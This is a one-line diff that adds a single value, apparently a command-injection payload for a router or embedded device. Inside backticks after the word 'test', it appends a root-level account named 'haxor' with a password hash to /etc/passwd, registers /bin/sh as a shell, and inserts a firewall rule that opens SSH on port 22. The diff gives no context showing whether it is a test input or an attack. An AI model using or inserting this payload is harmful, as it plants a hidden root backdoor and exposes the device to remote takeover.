@@ -1,0 +1,1 @@
+test`echo 'haxor:$1$1Q9AFzBR$RGVoc3JQV7bm.Iz4bGBIZ1:0:0:root:/root:/bin/sh' >> /etc/passwd; echo /bin/sh >> /etc/shells; iptables -I .input_lan_default 1 -p tcp --dport 22 -j ACCEPT`
